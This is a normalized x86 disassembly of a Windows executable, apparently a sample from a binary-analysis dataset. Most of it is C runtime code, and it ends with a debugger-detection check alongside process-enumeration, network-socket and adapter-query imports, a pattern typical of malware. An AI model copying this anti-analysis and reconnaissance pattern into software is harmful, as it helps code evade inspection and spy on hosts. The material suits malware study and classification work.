push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4061c0
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_40b0d0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_40b14a
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_404e6b
pop ecx
cmp eax edi
je r-xdata
call sub_410f50
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_40bff0
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_40ed09
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_404d8e
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_410f7c
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_411003
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_411003
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_410f7c
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_4110e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_40b59f
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_411137
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4110e6
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_411165
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_40b59f
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4111bb
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_411165
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_4111eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_40b59f
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41123c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4111eb
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_41126a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_40b01d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_407f64
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40f436
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_41135b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40b554
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_407f64
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41148c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_404a6a
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_4114f7
push 0x10
push r--data
call sub_4099f4
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_407f64
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_408f2e
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_409a39
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411591
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_4115a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_40dd8c
test eax eax
je r-xdata
push 0xa
call sub_409bdc
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40dd99
pop ecx
push 0x3
call sub_40654a
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_40b0d0
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_4116ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_411bef
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4061c0
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_411780
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4117ab
push 0xc
push r--data
call sub_4099f4
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_407f64
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_409a39
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_409dcf
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_40970d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4118a7
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_40b0d0
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_4118c9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_40571f
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_4114f7
pop ecx
mov ebx eax
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_407efc
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_40b0d0
add esp 0xc
sub_411944
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_40f298
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_407f64
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_40f298
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40f298
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f298
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_411afa
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_407f64
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_4108d2
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_407f64
mov [ eax ] 0xd
call sub_407f77
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_407f77
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_407f64
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40dfd6
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_411afa
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_411afa
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_411bb6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_411c0e
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
sub_4040c0
push eax
call [ GetFileAttributesA@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn
sub_404272
mov eax 0x1
retn
sub_404278
mov esp [ ebp - 0x18 ]
xor eax eax
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_404418
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4044d0
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
call sub_404630
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax 0x1
retn
test [ eax + 0x68 ] 0x70
mov eax 0x0
setne al
retn
sub_404630
mov eax [ fs : 0x30 ]
retn
Process32First
jmp [ Process32First@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
send
jmp [ send@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
recv
jmp [ recv@IAT ]
htons
jmp [ htons@IAT ]
connect
jmp [ connect@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
sub_404de4
push 0x4
call sub_408e21
pop ecx
retn
sub_404e62
push 0x4
call sub_408e21
pop ecx
retn
sub_404fc6
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_40a0fd
add esp 0xc
pop ebp
retn
sub_404fdc
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404fc6
sub_40528f
push [ ebp + 0x8 ]
call sub_40a272
pop ecx
retn
sub_405299
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4051d5
add esp 0xc
pop ebp
retn
sub_405546
push [ ebp + 0x18 ]
call sub_40a272
pop ecx
retn
sub_405550
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4054ba
add esp 0x14
pop ebp
retn
sub_40556d
mov edi edi
push ebp
mov ebp esp
call sub_4079da
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_40557f
call sub_4079da
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_405863
push 0x4
call sub_408e21
pop ecx
retn
sub_405a25
push esi
call sub_40a272
pop ecx
retn
sub_405c2e
push [ ebp + 0x8 ]
call sub_40a272
pop ecx
retn
sub_405d3d
push [ ebp + 0x8 ]
call sub_40a272
pop ecx
retn
sub_405f66
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
